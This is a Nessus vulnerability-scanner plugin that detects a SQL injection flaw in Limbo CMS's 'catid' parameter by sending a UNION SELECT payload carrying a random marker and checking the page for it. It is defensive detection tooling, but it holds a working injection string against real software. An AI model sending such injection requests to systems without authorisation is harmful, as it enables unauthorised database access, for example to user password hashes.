#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a SQL
injection issue. 

Description :

The remote host is running Limbo CMS, a content-management system
written in PHP. 

The version of Limbo CMS installed on the remote host fails to
sanitize input to the 'catid' parameter of the 'index.php' script
before using it in a database query.  An unauthenticated attacker may
be able to leverage this issue to manipulate SQL queries to uncover
password hashes for arbitrary users of the affected application. 

Note that successful exploitation requires that Limbo is configured to
use MySQL for its database backend, which is not the default. 

See also :

http://www.securityfocus.com/archive/1/433221/30/0/threaded
http://forum.limboforge.org/index.php?topic=6.0
http://limboforge.org/web/component/option,com_remository/Itemid,1/func,fileinfo/id,115/

Solution :

Apply Cumulative Patch v8 to Limbo 1.0.4.2 as referenced in the
advisories above. 

Risk factor :

Medium / CVSS Base Score : 4 
(AV:R/AC:H/Au:NR/C:P/A:N/I:P/B:N)";


if (description)
{
  script_id(21558);
  script_version("$Revision: 1.1 $");

  script_bugtraq_id(17870);

  script_name(english:"Limbo catid Parameter SQL Injection Vulnerability");
  script_summary(english:"Tries to affect DB queries in Limbo CMS");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/limbo", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  magic = rand_str(length:12, charset:"0123456789");
  exploit = string("-1 UNION SELECT 0,1,2,", magic, ",4,5,6,7,8,9,10,11/*");
  req = http_get(
    item:string(
      dir, "/index.php?",
      "option=weblinks&",
      "Itemid=2&",
      "catid=", urlencode(str:exploit)
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # we see our magic string and...
    string('div class="componentheading" >', magic) >< res &&
    # it looks like Limbo
    egrep(pattern:"Site powered By <a [^>]+>Limbo CMS<", string:res)
  )
  {
    security_warning(port);
    exit(0);
  }
}
